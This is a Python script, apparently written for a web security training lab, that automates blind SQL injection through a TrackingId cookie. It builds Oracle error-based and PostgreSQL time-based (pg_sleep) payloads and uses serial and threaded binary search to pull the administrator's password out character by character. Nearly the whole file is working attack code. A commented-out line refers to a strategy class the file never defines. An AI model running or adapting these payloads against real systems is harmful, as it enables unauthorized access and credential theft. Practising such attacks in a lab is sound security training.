from abc import ABC, abstractmethod
import requests
import time
import threading
from concurrent.futures import ThreadPoolExecutor
import os
from dotenv import load_dotenv

load_dotenv()
url = os.getenv("LAB_URL").rstrip('/')
session = os.getenv("SESSION_ID")
tracking_id = os.getenv("TRACKING_ID")

class InjectionStrategy(ABC):
    @abstractmethod
    def get_payload(self, pos: int, ascii_val: int) -> dict:
        """產生該資料庫專用的 Payload (回傳 cookies 或 params)"""
        pass

    @abstractmethod
    def is_truthy(self, response: requests.Response) -> bool:
        """定義什麼情況代表 'True' (例如: 500錯誤, 延遲5秒, 回傳特定字串)"""
        pass

    def check(self, pos: int, ascii_val: int) -> bool:
        """整合發送與判斷邏輯"""
        cookies = self.get_payload(pos, ascii_val)
        try:
            # 記錄時間以備 Time-based 使用
            start = time.time()
            r = requests.get(url, cookies=cookies, allow_redirects=False)
            r.elapsed_time = time.time() - start 
            return self.is_truthy(r)
        except Exception as e:
            return False
# --- 既有的 Oracle Error-Based ---

class OracleErrorStrategy(InjectionStrategy):
    def get_payload(self, pos, ascii_val):
        # Oracle 語法
        sql = f"' AND (SELECT CASE WHEN (SELECT ASCII(SUBSTR(password,{pos},1)) FROM users WHERE username = 'administrator') > {ascii_val} THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a"
        return {"TrackingId": tracking_id + sql, "session": session}

    def is_truthy(self, response):
        # 判斷標準：狀態碼 500 代表 True
        return response.status_code == 500

class PostgreSQLTimeStrategy(InjectionStrategy):
    def get_payload(self, pos, ascii_val):
        sql = f"'%3bSELECT+CASE+WHEN((SELECT+ASCII(SUBSTRING(password,{pos},1))+FROM+users+WHERE+username+%3d+'administrator')>{ascii_val})+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--"
        return {"TrackingId": tracking_id + sql, "session": session}

    def is_truthy(self, response):
        print(f"response time is: {response.elapsed_time}")
        return response.elapsed_time > 9.5
def binary_search(strategy: InjectionStrategy, password_len=20):
    password = ""
    chars = range(32, 127) # ASCII 可列印範圍
    
    print(f"[*] Starting attack using {strategy.__class__.__name__}...")

    for pos in range(1, password_len + 1):
        low, high = 0, len(chars) - 1
        found_char = "?"
        
        while low <= high:
            mid = (low + high) // 2
            guess_ascii = chars[mid]
            if strategy.check(pos, guess_ascii): 
                low = mid + 1
                print(f"Current Password: [{password}], Char is higher than: {chr(chars[mid])}")
            else:
                high = mid - 1
                print(f"Current: {password}, Char is lower than: {chr(chars[mid])}")
        
        if 0 <= high < len(chars):
            found_char = chr(chars[high] + 1) 
        
        password += found_char
        print(f"Pos {pos}: {password}")
def binary_search_threaded(strategy: InjectionStrategy, password_len=20, max_workers=36):
    """平行解每個位置：多個 position 同時做二分搜，加速整體解碼。"""
    chars = list(range(32, 127))  # ASCII 可列印範圍
    result = [None] * password_len  # 每個 thread 寫入 result[pos-1]
    print_lock = threading.Lock()

    def decode_position(pos: int) -> None:
        low, high = 0, len(chars) - 1
        found_char = "?"
        while low <= high:
            mid = (low + high) // 2
            guess_ascii = chars[mid]
            if strategy.check(pos, guess_ascii):
                low = mid + 1
            else:
                high = mid - 1
        if 0 <= high < len(chars):
            found_char = chr(chars[high] + 1)
        result[pos - 1] = found_char
        with print_lock:
            current = "".join(c if c else "?" for c in result)
            print(f"Pos {pos} done: {current}")

    print(f"[*] Starting attack using {strategy.__class__.__name__} (threaded, workers={max_workers})...")
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        executor.map(decode_position, range(1, password_len + 1))
    password = "".join(result)
    print(f"[*] Done: {password}")
    return password

#strategy = OracleErrorStrategy()
#strategy = MySQLTimeStrategy()

strategy = PostgreSQLTimeStrategy()
binary_search(strategy)